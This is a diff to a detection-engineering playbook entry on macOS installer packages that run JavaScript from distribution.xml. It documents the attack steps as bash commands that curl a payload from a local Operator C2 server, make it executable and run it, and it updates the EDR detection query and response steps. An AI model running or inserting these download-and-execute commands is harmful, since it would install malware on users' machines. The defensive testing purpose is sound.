@@ -79,8 +79,8 @@ Commands:
       - Step: Review the children of process InstallerRemotePluginService.
       - Step: Review process creations, network connections and file writes of all children processes of InstallerRemotePluginService.
 
-  - Name: Installer Package w/ JavaScript Functionality embedded
-    Description: This query detects installer packages leveraging JavaScript functionality via distribution.xml files.
+  - Name: installer package w/ javascript functionality
+    Description: This query detects installer packages leveraging JavaScript functionality via distribution.xml files. The malicious commands can either be in distrubtion.xml file, or the distribution.xml file invoke a script included in the installer. You should test both cases by generating the payloads using iShelly.
     Usecase: Adversaries may pair this technique with a social engineering component to execute malware. Adversaries may use this technique to generate less known EDR behavioral patterns or when they need malware running as user.
     Category: Execution
     Privileges: User
@@ -90,13 +90,14 @@ Commands:
       - Step: Installer prompts the user with subject "This package will run a program to determine if the software can be installed".
       - Step: Installer launches bash process with cmdline <pre><code>/bin/bash -c /usr/bin/curl -k 'http://127.0.0.1:3391/payloads/d2526ae26fc2139263f57c2af445004e385772ec/operator-payload' -o /Users/$USER/Library/Application\\ Support/operator-payload </pre></code>
       - Step: bash launches curl which makes a network connection to Operator and writes payload to /Users/anadrowski/Library/Application Support/operator-payload.
-      - Step: The same Installer process launches a new bash process with cmdline <pre><code>/bin/bash -c chmod +x /Users/$USER/Library/Application\\ Support/operator-payload </pre></code> to make the payload executable.
-      - Step: The same Installer process launches a new bash process with cmdline <pre><code>/bin/bash -c /Users/$USER/Library/Application\\ Support/operator-payload -name installer-js-embedded & </pre></code> to execute the payload.
+      - Step: The same Installer process launches a new bash process to make the payload executable with the following cmdline <pre><code>/bin/bash -c chmod +x /Users/$USER/Library/Application\\ Support/operator-payload </pre></code>
+      - Step: Thhe same Installer process launches a new bash process to execute the payload with the following cmdline <pre><code>/bin/bash -c /Users/$USER/Library/Application\\ Support/operator-payload -name installer-js-embedded & </pre></code>
+      - Step: If testing the script functionality of this vector, the previous step will instead contain the following cmdline <pre><code>/bin/bash -c /Users/$USER/Library/Application\\ Support/operator-payload -name installer-js-script & </pre></code>
     Execute:
-      - Prelude Operator: Run <a href="https://github.com/AutomoxSecurity/iShelly">iShelly</a> with the "Installer Package w/ Installer Plugin" Installer Package option.
+      - Prelude Operator: Run <a href="https://github.com/AutomoxSecurity/iShelly">iShelly</a> with either the "Installer Package w/ JavaScript Functionality embedded" or "Installer Package w/ JavaScript Functionality in Script" Installer Package option. The embedded option contains the malicious code within the distribution.xml, while the script option contains malicious code in a script file, which is contained
     Detect:
-      - EDR: process_name = "InstallerRemotePluginService-x86_64"
+      - EDR: parent_process_name = "Installer" AND NOT (process_name = "installd" OR process_name = "InstallerRemotePluginService-x86_64" OR process_name= "MTLCompilerService" OR process_name = "package_script_service")
     Respond:
-      - Step: Review the children of process InstallerRemotePluginService.
-      - Step: Review process creations, network connections and file writes of all children processes of InstallerRemotePluginService.
+      - Step: Review the children of process Installer.
+      - Step: Review process creations, network connections and file writes of all children processes of Installer.
 ---
